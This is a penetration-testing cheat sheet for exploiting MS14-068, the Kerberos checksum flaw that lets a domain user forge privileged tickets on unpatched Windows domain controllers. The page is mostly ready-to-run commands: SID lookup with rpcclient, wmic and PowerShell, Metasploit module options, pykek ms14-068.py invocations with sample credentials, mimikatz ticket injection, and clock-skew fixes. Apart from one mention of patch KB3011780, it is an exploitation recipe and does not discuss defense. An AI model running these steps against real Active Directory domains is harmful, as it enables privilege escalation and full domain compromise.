# Kerberos Checksum Validation ( MS14-068 )

{% embed url="https://github.com/gentilkiwi/kekeo/wiki/ms14068" %}

The vulnerability patches an issue with how the Domain Controller validates group membership in Kerberos tickets (hint: the ticket is always validated by the DC if the checksum is set to certain values). Microsoft KB3011780 patches this issue.

{% hint style="info" %}
This vulnerability will impact the windows server versions up to windows server 2012 R2.
{% endhint %}

#### This exploit require to know the user SID, you can use `rpcclient` to remotely get it or `wmi` if you have an access on the machine.

## <mark style="color:red;">Finding SID</mark>

to find the SID remotely:

```
rpcclient $> lookupnames john.smith
```

convert SID to username:

```
([System.Security.Principal.SecurityIdentifier]('PUT-SID-HERE')).Translate([System.Security.Principal.NTAccount]).Value
```

convert username to SID:

```
([System.Security.Principal.NTAccount]("domain\john.smith")).Translate([System.Security.Principal.SecurityIdentifier]).Value
```

to find SID locally:

```
wmic useraccount get name,sid
Convert-NameToSid high-sec-corp.localkrbtgt (powerview)
```

## <mark style="color:red;">Generating Ticket</mark>

can use pykek or metasploit:

```
Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum

Name      Current Setting                                Required  Description
   ----      ---------------                                --------  -----------
   DOMAIN    LABDOMAIN.LOCAL                                yes       The Domain (upper case) Ex: DEMO.LOCAL
   PASSWORD  P@ssw0rd                                       yes       The Domain User password
   RHOSTS    10.10.10.10                                    yes       The target address range or CIDR identifier
   RPORT     88                                             yes       The target port
   Timeout   10                                             yes       The TCP timeout to establish connection and read data
   USER      lambda                                         yes       The Domain User
   USER_SID  S-1-5-21-297520375-2634728305-5197346142-1106  yes       The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000
```

```
git clone https://github.com/SecWiki/windows-kernel-exploits

python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword>
python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org
python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10
python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066
-1105
```

## <mark style="color:red;">Loading the Ticket</mark>

Use `mimikatz` to load the ticket.

```
mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
```

If the clock is skewed use `clock-skew.nse` script from `nmap`

```
Linux> $ nmap -sV -sC 10.10.10.10
clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s

Linux> sudo date -s "14 APR 2015 18:25:16" 
Windows> net time /domain /set
```
